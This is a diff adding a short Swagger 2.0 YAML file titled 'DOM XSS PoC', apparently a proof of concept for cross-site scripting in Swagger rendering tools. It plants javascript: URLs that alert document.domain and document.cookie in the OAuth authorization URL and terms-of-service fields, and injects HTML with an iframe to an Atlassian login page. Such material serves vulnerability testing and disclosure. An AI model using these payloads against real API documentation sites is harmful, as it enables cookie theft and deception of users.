@@ -1,0 +1,16 @@
+swagger: '2.0'
+securityDefinitions:
+  a:
+    type: oauth2
+    authorizationUrl: javascript:alert(document.domain)//
+info:
+  version: "0.0.1"
+  title: DOM XSS PoC
+  description: <h1>XSS</h1><iframe src="https://id.atlassian.com" allow="camera:*;" >
+  termsOfService: "javascript:alert(document.cookie)"
+paths:
+  /:
+    get:
+      responses:
+        200:
+          description: Successful response
